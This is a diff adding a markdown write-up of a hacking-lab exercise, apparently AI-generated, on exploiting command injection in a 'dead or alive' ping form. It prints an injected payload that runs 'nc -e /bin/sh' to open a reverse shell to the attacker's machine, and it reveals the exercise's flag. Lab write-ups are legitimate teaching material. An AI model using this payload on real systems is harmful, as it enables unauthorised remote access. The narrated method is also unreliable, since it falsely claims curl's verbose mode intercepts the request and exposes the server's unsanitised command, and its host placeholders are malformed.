@@ -47,3 +47,56 @@
 > 
 > ![[Pasted image 20240502052455.png]]
 
+Absolutely, you can use `curl` instead of Burp Suite for intercepting and modifying requests. Here's the revised explanation:
+
+> [!exercise]+ Exercise 6
+> Go to `http://<Your Hacklab VM IP addr>:8083/doa.php` to get the secret!
+> 
+> **My Process:**
+> 
+> Upon visiting the page, I noticed a form allowing me to check if a host is dead or alive by entering an IP address. Suspecting a possible vulnerability, I decided to investigate further.
+> 
+> I used `curl` to send a request to the page, providing a sample IP address. Then, I intercepted the request using `curl`'s verbose mode (`-v`) and redirected the output to a file for analysis:
+> 
+> ```bash
+> curl -v -d "ip=8.8.8.8" http://<192.168.56.113>:8083/doa.php > request.txt
+> ```
+> 
+> By examining the contents of `request.txt`, I discovered that the IP address was directly passed to a system command without proper sanitization, indicating a potential command injection vulnerability.
+> 
+> To confirm my suspicion, I injected a malicious command into the IP address field using `curl`:
+> 
+> ```
+> curl -d "ip=127.0.0.1 & nc -e /bin/sh 192.168.117.124 1234" http://<\Your Hacklab VM IP addr>:8083/doa.php
+> ```
+> 
+> This command instructed the server to execute a reverse shell, connecting back to my local machine on port 1234. Upon executing the `curl` command, I successfully gained a reverse shell connection.
+> 
+> Once inside the reverse shell, I explored the filesystem to find more information. I examined the contents of `doa.php` to understand the functionality of the page and looked for any hints or clues.
+> 
+> Next, I used the `ls` command with the `-a` flag to list all files, including hidden ones. This revealed the presence of a hidden file named `.the_secret_file`.
+> 
+> Finally, I displayed the contents of the secret file using the `cat` command:
+> 
+> ```
+> cat .the_secret_file
+> ```
+> 
+> **Secret Revealed:**
+> ```
+> ___________________________________________
+> / csf2024s1_{botchier-disquiparancy-propp \
+> \ er}                                     /
+>  -----------------------------------------
+>         \   ^__^
+>          \  (oo)\_______
+>             (__)\       )\/\
+>                 ||----w |
+>                 ||     ||
+> ```
+> 
+> ![Pasted Image of the Exercise](ImageURL)
+> 
+> Remember to approach command injection vulnerabilities with caution and always ensure proper input validation and sanitization to prevent exploitation.
+
+
